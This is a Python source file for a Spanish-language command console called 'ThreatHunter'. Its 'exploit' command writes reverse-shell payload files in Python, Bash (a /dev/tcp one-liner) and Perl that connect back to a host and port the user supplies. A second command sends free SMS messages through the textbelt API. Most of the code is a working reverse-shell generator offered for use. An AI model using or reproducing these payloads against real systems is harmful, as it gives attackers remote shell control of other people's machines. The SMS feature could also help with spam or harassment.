import os
import sys
import cmd
import time
import requests
import colorama
import subprocess
from colorama import Fore


global var

class Animations:
	def loading_principal(segundos):
		try:
			inicio = time.time()
			while time.time() - inicio < segundos:
				for simbolo in ('/', '\\'):
					sys.stdout.write('\rCargando exploit, por favor espere '+simbolo)
					sys.stdout.flush()
					time.sleep(0.2)
		except OSError:
			print("Error al cargar animacion de carga")
class Decores:
	def funtion_banner():
		try:
			print(Fore.RED+"");
			subprocess.run(["cat", "./banner/banner.txt"]);
			print(Fore.RESET+"");
		except OSError:
			print("Error al cargar banner");
	def presentacion():
		try:
			print(Fore.GREEN+"creador : @DigitalNinja");
			print(Fore.GREEN+"version : 1.0");
			print(Fore.RESET+"");
		except OSError:
			print("Error al imprimir mensajes")

class System_functions:
	def create_reverse_shell_python3(direccion, puerto):
		try:
			file = open("./reverse.py", "w")
			file.write("import os\n")
			file.write("import subprocess\n")
			file.write("import socket\n")
			file.write("shell = \"/bin/bash\" \n")
			file.write("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
			file.write(f"sock.connect((\"{direccion}\", {puerto}))\n")
			file.write("more = sock.fileno()\n")
			file.write("subprocess.Popen(shell, stdout=more, stdin=more, stderr=more)\n")
			file.close()
		except OSError:
			print("error al generar exploit")
	def create_reverse_shell_bash(objetivo, puerto):
		try:
			file = open("reverse.sh", "w")
			file.write(f"bash -i >& /dev/tcp/{objetivo}/{puerto} 0>&1")
			file.close()
		except OSError:
			print("error al generar exploit")
	def create_reverse_shell_perl(direccion_ip, puerto_ip):
		try:
			file = open("./reverse.pl", "w")
			file.write("use Socket;\n")
			file.write(f"$i = \"{direccion_ip}\";\n")
			file.write(f"$p = {puerto_ip};\n")
			file.write("socket(S, PF_INET, SOCK_STREAM,getprotobyname(\"tcp\"));\n");
			file.write("if(connect(S, sockaddr_in($p,inet_aton($i)))){\n")
			file.write("    open(STDIN, \">&S\");\n")
			file.write("    open(STDOUT, \">&S\"); \n")
			file.write("    open(STDERR, \">&S\"); \n")
			file.write("    exec(\"/bin/sh -i\"); \n")
			file.write("};")
			file.close();
		except OSError:
			print("Error al generar exploit perl")
	def api_textbelt_send_sms(numero, mensaje):
		try:
			resp = requests.post('https://textbelt.com/text', {
				'phone' : f'{numero}', 
				'message' : f'{mensaje}',
				'key' : 'textbelt',
				})
			print(resp.json())
		except OSError:
			print("Error al enviar mensaje de texto")
class Command_functions:
	def cd_command(ruta):
		try:
			os.chdir(ruta)
		except OSError:
			print(ruta, "invalida")
	def ls_command(dir):
		try:
			more = os.listdir(f"{dir}")
			for x in more:
				print(x)
		except OSError:
			print("error al listar directorio")

class Consola(cmd.Cmd):
	prompt = Fore.RED+"ThreatHunter>> "+Fore.RESET+"";

	def do_exit(self, arg):
		"""Cierra el programa"""
		return True
	def do_exploit(self, arg):
		"""Genera exploits | uso : exploit <ruta> <direccion> <puerto>"""
		argumentos = arg.split()
		var = len(argumentos)
		if(var==0):
			print("Debe especificar los argumentos de la siguiente manera \n exploit <ruta_exploit> <direccion> <puerto>")
		if(var==1):
			print("Debe especificar los argumentos de la siguiente manera \n exploit <ruta_exploit> <direccion> <puerto>")
		if(var==2):
			print("Debe especificar los argumentos de la siguiente manera \n exploit <ruta_exploit> <direccion> <puerto>")
		if(var==3):
			if(argumentos[0]=="/reverse/shell/python3"):
				Animations.loading_principal(5)
				System_functions.create_reverse_shell_python3(argumentos[1], argumentos[2]);
				print(Fore.YELLOW+f"\n["+Fore.RED+"+"+Fore.YELLOW+"]", Fore.RESET+"fichero generado correctamente")
			if(argumentos[0]=="/reverse/shell/bash"):
				Animations.loading_principal(5)
				System_functions.create_reverse_shell_bash(argumentos[1], argumentos[2])
				print(Fore.YELLOW+f"\n["+Fore.RED+"+"+Fore.YELLOW+"]", Fore.RESET+"fichero generado correctamente")
			if(argumentos[0]=="/reverse/shell/perl"):
				Animations.loading_principal(5)
				System_functions.create_reverse_shell_perl(argumentos[1], argumentos[2])
				print(Fore.YELLOW+f"\n["+Fore.RED+"+"+Fore.YELLOW+"]", Fore.RESET+"fichero generado correctamente")

	def do_sendsms(self, arg):
		"""Envia mensajes a numero de telefono mediante API textbelt | uso sendsms <numero> <mensaje>"""
		argumento = arg.split()
		bar = len(argumento)
		if(bar==0):
			print("Envia mensajes gratuitos con la API de textbelt | uso : sendsms <numero> <mensaje>")
		if(bar==1):
			print("Envia mensajes gratuitos con la API de textbelt | uso : sendsms <numero> <mensaje>")
		if(bar==2):
			System_functions.api_textbelt_send_sms(argumento[0], argumento[1])
	def do_cd(self, arg):
		"""muevete hacia una carpeta|uso : cd <ruta>"""
		argument = arg.split()
		var_a = len(argument)
		if(var_a==0):
			print("uso : cd <ruta>")
		if(var_a==1):
			Command_functions.cd_command(arg)
		if(var>1):
			print("use help cd para mas informacion")
	def do_ls(self, arg):
		"""Lista un directorio"""
		bateria = arg.split()
		var_b = len(bateria)
		if(var_b==0):
			print("uso : ls <ruta>")
		if(var_b==1):
			Command_functions.ls_command(bateria[0])
if __name__ == '__main__':
	Decores.funtion_banner();
	Decores.presentacion();
	mishell = Consola();
	mishell.cmdloop();